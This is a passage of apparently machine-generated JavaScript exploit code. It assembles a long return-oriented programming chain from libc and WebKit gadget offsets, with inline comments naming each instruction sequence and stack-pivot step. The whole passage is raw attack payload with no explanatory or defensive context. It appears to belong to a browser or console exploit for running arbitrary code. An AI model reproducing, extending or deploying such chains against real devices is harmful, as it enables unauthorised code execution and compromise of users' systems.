set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2702:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+763368,); //pop rcx
//L2703:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1160480, //L2705
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1160496, //L2706
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2705:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2706:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1160616, //L2710
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1160584, //L2708
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+144605 //pop rdi
]);
//L2708:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L2709:
db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+763368,); //pop rcx
//L2710:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+20307877, //mov [rax], rcx
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2712:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+763368,); //pop rcx
//L2713:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1160760, //L2715
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1160776, //L2716
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2715:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2716:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1160936, //L2719
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1160968, //L2721
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1160920, //L2718
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1160952, //L2720
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2718:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2719:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2720:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2721:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1161088, //L2724
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1161056, //L2722
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+144605 //pop rdi
]);
//L2722:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L2723:
db([4294967252, 4294967295]); // -0x2c
set_gadget(libc_base+763368,); //pop rcx
//L2724:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+3488438, //mov [rax], ecx
libc_base+764760, //pop rsi
ropchain+1161152, //L2727
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2727:
db([0, 0]); // 0x0
//L2726:
set_gadgets([
libc_base+764760, //pop rsi
ropchain+1161216, //L2730
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2729:
db([4294967252, 4294967295]); // -0x2c
set_gadget(libc_base+763368,); //pop rcx
//L2730:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1161304, //L2732
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1161320, //L2733
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2732:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2733:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1161480, //L2736
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1161512, //L2738
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1161464, //L2735
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1161496, //L2737
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2735:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2736:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2737:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2738:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1161592, //L2739
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1161608, //L2740
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2739:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2740:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1161720, //L2742
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1161768, //L2745
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1161736, //L2743
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2742:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2743:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L2744:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2745:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+21212296, //cmp rax, rsi ; sete al
libc_base+226597, //movzx eax, al
webkit_base+5507491, //shl rax, 3
libc_base+764760, //pop rsi
ropchain+1161880, //L2746+8
libc_base+501454, //add rax, rsi
libc_base+501611, //mov rax, [rax]
libc_base+764760, //pop rsi
ropchain+1161872, //L2746
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+782311 //pop rsp
]);
//L2746:
db([0, 0]); // 0x0
set_gadgets([
ropchain+1161896, //L2746+24
ropchain+1167272, //L2741
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2747:
db([4294967252, 4294967295]); // -0x2c
set_gadget(libc_base+763368,); //pop rcx
//L2748:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1162016, //L2750
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1162032, //L2751
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2750:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2751:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1162192, //L2754
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1162224, //L2756
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1162176, //L2753
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1162208, //L2755
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2753:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2754:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2755:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2756:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1162304, //L2757
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1162320, //L2758
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2757:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2758:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1162416, //L2760
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1162400, //L2759
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2759:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2760:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1162512, //L2762
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2761:
db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+763368,); //pop rcx
//L2762:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1162600, //L2764
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1162616, //L2765
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2764:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2765:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1162760, //L2769
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1162728, //L2767
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1162744, //L2768
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2767:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2768:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2769:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1162856, //L2771
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2770:
db([4294967280, 4294967295]); // -0x10
set_gadget(libc_base+763368,); //pop rcx
//L2771:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1162944, //L2773
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1162960, //L2774
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2773:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2774:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1163120, //L2777
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1163152, //L2779
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1163104, //L2776
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1163136, //L2778
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2776:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2777:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2778:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2779:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1163248, //L2781
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1163232, //L2780
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2780:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2781:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608, //pop rax
//L2783:
ropchain+1163352, //L2782
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+782311, //pop rsp
ropchain+1168536, //L2784
//L2782:
libc_base+853989, //mov rax, rcx
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1163440, //L2786
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2785:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+763368,); //pop rcx
//L2786:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+3488438, //mov [rax], ecx
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2788:
db([4294967248, 4294967295]); // -0x30
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1163568, //L2790
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1163584, //L2791
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2790:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2791:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1163744, //L2794
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1163776, //L2796
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1163728, //L2793
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1163760, //L2795
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2793:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2794:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2795:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2796:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1163856, //L2797
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1163872, //L2798
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2797:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2798:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1163968, //L2800
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1163952, //L2799
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2799:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2800:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1164048, //L2801
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2801:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2802:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2803:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1164208, //L2805
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1164224, //L2806
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1164192, //L2804
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2804:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2805:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2806:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
webkit_base+6378709, //cmp rax, rcx ; sete al
webkit_base+2115150, //setle al
libc_base+226597, //movzx eax, al
libc_base+764760, //pop rsi
ropchain+1164400, //L2808
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1164416, //L2809
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1164384, //L2807
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2807:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2808:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2809:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1164528, //L2811
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1164576, //L2814
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1164544, //L2812
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2811:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2812:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L2813:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2814:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+21212296, //cmp rax, rsi ; sete al
libc_base+226597, //movzx eax, al
webkit_base+5507491, //shl rax, 3
libc_base+764760, //pop rsi
ropchain+1164688, //L2815+8
libc_base+501454, //add rax, rsi
libc_base+501611, //mov rax, [rax]
libc_base+764760, //pop rsi
ropchain+1164680, //L2815
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+782311 //pop rsp
]);
//L2815:
db([0, 0]); // 0x0
set_gadgets([
ropchain+1164704, //L2815+24
ropchain+1164720, //L2810
libc_base+782311, //pop rsp
ropchain+1167304, //L2816
//L2810:
libc_base+764760, //pop rsi
ropchain+1164776, //L2818
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2817:
db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+763368,); //pop rcx
//L2818:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1164864, //L2820
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1164880, //L2821
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2820:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2821:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1165024, //L2825
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1164992, //L2823
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1165008, //L2824
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2823:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2824:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2825:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1165096, //L2827
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2827:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1165152, //L2828
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2828:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1165248, //L2831
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2830:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+763368,); //pop rcx
//L2831:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1165336, //L2833
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1165352, //L2834
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2833:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2834:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1165512, //L2837
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1165544, //L2839
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1165496, //L2836
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1165528, //L2838
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2836:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2837:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2838:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2839:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1165672, //L2841
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1165688, //L2842
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1165656, //L2840
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2840:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2841:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2842:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1165776, //L2844
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2844:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1165832, //L2845
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2845:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1165920, //L2848
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2847:
db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+763368,); //pop rcx
//L2848:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+20307877, //mov [rax], rcx
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2850:
db([4294967252, 4294967295]); // -0x2c
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1166048, //L2852
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1166064, //L2853
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2852:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2853:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1166224, //L2856
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1166256, //L2858
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1166208, //L2855
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1166240, //L2857
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2855:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2856:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2857:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2858:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1166352, //L2860
